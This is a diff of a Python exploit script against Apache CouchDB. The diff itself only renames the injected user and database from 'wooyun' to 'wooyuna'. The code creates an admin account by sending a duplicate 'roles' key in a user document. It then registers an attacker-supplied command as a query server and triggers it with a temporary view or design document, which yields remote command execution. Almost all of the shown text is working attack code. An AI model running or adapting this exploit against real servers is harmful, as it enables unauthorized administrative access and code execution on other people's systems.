@@ -15,15 +15,15 @@ session.headers = {
     'Content-Type': 'application/json'
 }
 
-session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
+session.put(target + '/_users/org.couchdb.user:wooyuna', data='''{
   "type": "user",
-  "name": "wooyun",
+  "name": "wooyuna",
   "roles": ["_admin"],
   "roles": [],
-  "password": "wooyun"
+  "password": "wooyuna"
 }''')
 
-session.auth = HTTPBasicAuth('wooyun', 'wooyun')
+session.auth = HTTPBasicAuth('wooyuna', 'wooyuna')
 try :
     if version == 1:
         session.put(target + ('/_config/query_servers/cmd'), data=command, timeout=60)
@@ -32,11 +32,11 @@ try :
         session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command, timeout=60)
 except:
     a=""
-session.put(target + '/wooyun')
-session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')
+session.put(target + '/wooyuna')
+session.put(target + '/wooyuna/test', data='{"_id": "wooyunatest"}')
 
 if version == 1:
-    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
+    session.post(target + '/wooyuna/_temp_view?limit=10', data='{"language":"cmd","map":""}')
 else:
-    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
+    session.put(target + '/wooyuna/_design/test', data='{"_id":"_design/test","views":{"wooyuna":{"map":""} },"language":"cmd"}')
 
